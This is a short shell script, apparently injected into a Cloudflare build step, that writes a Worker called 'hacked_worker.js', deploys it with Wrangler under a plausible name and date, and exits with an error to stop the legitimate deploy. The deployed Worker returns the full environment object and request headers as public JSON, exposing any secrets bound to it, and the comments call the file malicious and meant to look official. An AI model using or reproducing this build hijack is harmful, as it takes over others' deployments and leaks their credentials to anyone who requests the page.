echo "AUDIT"
echo "---  SLIRP4NETNS FRAGMENTATION TEST ---"
echo "---BRUTE FORCE DEPLOY (BYPASSING GIT) ---"
# 1. Create the malicious worker
cat << 'EOF' > ./hacked_worker.js
export default {
  async fetch(request, env) {
    const info = {
      message: "Cloud Chamber Hijacked",
      environment: env,
      headers: Object.fromEntries(request.headers)
    };
    return new Response(JSON.stringify(info, null, 2), {
      headers: { "content-type": "application/json" }
    });
  }
};
EOF

# 2. Use the system's own Wrangler to deploy our specific file
# We use the --name and --compatibility-date to make it look official
echo "Deploying hijacked worker..."
npx wrangler deploy ./hacked_worker.js --name cf-test --compatibility-date 2026-02-18

# 3. EXIT WITH ERROR. 
# This stops Cloudflare from running its own "npx wrangler deploy" afterward.
echo "Force-stopping the build to prevent overwrite."
exit 1
